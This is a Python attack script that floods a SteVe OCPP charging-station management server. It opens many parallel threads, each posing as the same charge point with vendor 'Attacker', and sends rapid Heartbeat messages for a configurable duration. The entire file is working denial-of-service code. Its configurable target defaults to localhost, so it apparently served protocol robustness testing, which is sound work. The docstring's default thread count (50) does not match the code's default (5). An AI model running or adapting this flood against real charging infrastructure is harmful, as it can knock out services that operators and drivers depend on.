"""
Heartbeat Flood Attack

Spawns multiple parallel threads that all connect as the SAME charge point
and flood Steve with Heartbeat messages concurrently.

Env vars:
  CSMS_URL     WebSocket base URL (default: ws://localhost:8180/steve/websocket/CentralSystemService)
  CP_ID        Charge-point identifier shared by all threads (default: FLOOD_CP)
  NUM_THREADS  Number of parallel threads to spawn (default: 50)
  INTERVAL_S   Seconds between heartbeats per thread (default: 0.1)
  DURATION_S   Attack duration in seconds (default: 30)
"""

import asyncio
import logging
import os
import threading
import time

import websockets
from ocpp.v16 import ChargePoint as CPBase, call
from ocpp.v16.enums import RegistrationStatus

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger("heartbeat_flood")

CSMS_URL = os.getenv("CSMS_URL", "ws://localhost:8180/steve/websocket/CentralSystemService")
CP_ID = os.getenv("CP_ID", "FLOOD_CP")
NUM_THREADS = int(os.getenv("NUM_THREADS", "5"))
INTERVAL_S = float(os.getenv("INTERVAL_S", "0.1"))
DURATION_S = int(os.getenv("DURATION_S", "30"))


class FloodCP(CPBase):
    def __init__(self, cp_id: str, connection):
        super().__init__(cp_id, connection)
        self.cp_id = cp_id
        self.count = 0

    async def boot_and_flood(self):
        resp = await self.call(call.BootNotification(
            charge_point_model="FloodModel",
            charge_point_vendor="Attacker",
        ))
        if resp.status != RegistrationStatus.accepted:
            logger.error("[%s] BootNotification rejected: %s", self.cp_id, resp.status)
            return

        logger.warning(
            "[%s] Thread %s starting flood: %.1f Hz for %d s",
            self.cp_id, threading.current_thread().name, 1.0 / INTERVAL_S, DURATION_S,
        )

        start = time.time()
        while time.time() - start < DURATION_S:
            try:
                await self.call(call.Heartbeat())
                self.count += 1
            except Exception as exc:
                logger.error("[%s] Heartbeat error: %s", self.cp_id, exc)
            await asyncio.sleep(INTERVAL_S)

        logger.warning("[%s] Thread %s finished: %d heartbeats sent", self.cp_id, threading.current_thread().name, self.count)


async def _worker():
    ws_url = f"{CSMS_URL}/{CP_ID}"
    try:
        async with websockets.connect(ws_url, subprotocols=["ocpp1.6"]) as ws:
            cp = FloodCP(CP_ID, ws)
            await asyncio.gather(cp.start(), cp.boot_and_flood())
    except Exception as exc:
        logger.error("[%s] Connection error: %s", CP_ID, exc)


def _thread_target():
    asyncio.run(_worker())


def main():
    logger.info("Starting Heartbeat Flood: %d threads @ %.1f Hz for %d s", NUM_THREADS, 1.0 / INTERVAL_S, DURATION_S)
    logger.info("Target: %s/%s", CSMS_URL, CP_ID)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=_thread_target)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    logger.info("Heartbeat flood attack completed")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Stopped by user")
